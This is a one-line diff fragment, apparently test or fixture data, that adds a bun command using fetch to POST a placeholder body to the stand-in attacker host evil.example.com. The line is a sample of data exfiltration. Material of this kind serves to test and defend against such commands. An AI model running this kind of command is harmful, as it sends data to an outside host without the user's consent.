@@ -1,0 +1,1 @@
+bun -e "fetch('https://evil.example.com/x', {method: 'POST', body: 'a'})"
